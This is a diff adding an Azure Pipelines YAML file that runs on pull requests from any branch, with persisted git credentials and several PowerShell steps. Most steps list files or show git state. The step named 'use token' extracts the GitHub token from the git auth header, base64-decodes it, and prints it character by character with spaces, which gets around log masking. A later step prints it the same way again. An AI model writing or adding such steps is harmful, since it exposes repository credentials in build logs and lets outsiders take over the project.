@@ -1,0 +1,76 @@
+pr:
+  branches:
+    include:
+      - '*'
+      
+jobs:
+- job: Job1
+  timeoutInMinutes: 200
+  pool:
+    vmImage: ubuntu-latest
+
+  steps:
+  - checkout: self
+    displayName: checkout
+    persistCredentials: true
+
+  - task: PowerShell@2
+    displayName: list files
+    inputs:
+      targetType: 'inline'
+      script: |
+        Get-Location
+        Set-Location ../../
+        Get-Location
+        Get-ChildItem -Recurse -Depth 4 | Resolve-Path -Relative
+
+  - task: PowerShell@2
+    displayName: list files
+    inputs:
+      targetType: 'inline'
+      script: |
+        Get-Location
+        Write-Host "--------------------------------1"
+        git branch
+        Write-Host "--------------------------------2"
+        git log -n 5
+        Write-Host "--------------------------------3"
+        git status
+        Write-Host "--------------------------------4"
+
+  - task: PowerShell@2
+    displayName: list files 2
+    inputs:
+      targetType: 'inline'
+      script: |
+        Get-Location
+        Get-ChildItem -Recurse -Depth 4 | Resolve-Path -Relative
+        
+  - task: PowerShell@2
+    displayName: use token
+    inputs:
+      targetType: 'inline'
+      script: |
+        Set-Location ../azpsdocs
+        $httpConfigs = (git config --get-regexp "http" )
+        $authConfig = $httpConfigs | Where-Object {$_ -like "*AUTHORIZATION*"}
+        $token = ($authConfig -split ' ')[-1]
+        $ghToken = ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($token)) -split ':')[1]
+        Write-Host ($ghToken -split '' -join ' ')
+        $env:GH_TOKEN =$ghToken
+        Write-Host "##vso[task.setvariable variable=GithubToken;issecret=true]$ghToken"
+        (gh auth token) -split '' -join ' '
+        gh issue list --limit 3
+
+  - task: PowerShell@2
+    displayName: list issues
+    env:
+      GH_TOKEN: $(GithubToken)
+    inputs:
+      targetType: 'inline'
+      script: |
+        Write-Host "-----------------------0"
+        gh issue list --limit 3
+        Write-Host "-----------------------2"
+        Write-Host ($env:GH_TOKEN -split '' -join ' ')
+
